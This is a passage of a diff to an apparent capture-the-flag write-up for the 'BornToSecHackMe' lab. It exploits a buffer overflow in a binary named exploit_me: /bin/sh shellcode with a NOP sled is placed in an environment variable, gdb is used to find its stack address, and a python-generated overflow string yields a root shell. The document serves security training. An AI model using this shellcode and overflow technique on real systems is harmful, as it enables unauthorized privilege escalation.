-0xbffff72d:     0x9090909090909090      0x9090909090909090
-0xbffff73d:     0x9090909090909090      0x9090909090909090
-0xbffff74d:     0x9090909090909090      0x9090909090909090
-0xbffff75d:     0x9090909090909090      0x9090909090909090
-0xbffff76d:     0x9090909090909090      0x9090909090909090
-0xbffff77d:     0x9090909090909090      0x9090909090909090
-0xbffff78d:     0x9090909090909090      0x9090909090909090
-0xbffff79d:     0x9090909090909090      0x9090909090909090
-0xbffff7ad:     0x9090909090909090      0x9090909090909090
-0xbffff7bd:     0x9090909090909090      0x9090909090909090
-0xbffff7cd:     0x9090909090909090      0x9090909090909090
----Type <return> to continue, or q <return> to quit---q
-Quit
-(gdb) q
-A debugging session is active.
-
-        Inferior 1 [process 2630] will be killed.
-
-Quit anyway? (y or n) y
-zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "i"*140 + "\x3d\xf7\xff\xbf"')
-iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii=   
-#
-
-
-
-0xbffff8ef
-$(python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"')
-
-
+```
 zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 zaz@BornToSecHackMe:~$ gdb ./exploit_me
 (gdb) b main
@@ -1344,9 +1151,15 @@ Breakpoint 1, 0x080483f7 in main ()
 0xbffff90f:     0x2f2f6850c0319090      0x896e69622f686873
 0xbffff91f:     0xcd0bb0e1895350e3      0x3d4c4c4548530080
 [...]
+```
+SHELLCODE is located at `0xbffff83f`. Knowing this we can start exploit_me with this small script:
+`python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"'`
+
+```
 zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"'`
 iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii    
 # whoami
 root
+```
 
-
+**Finally we are Root**
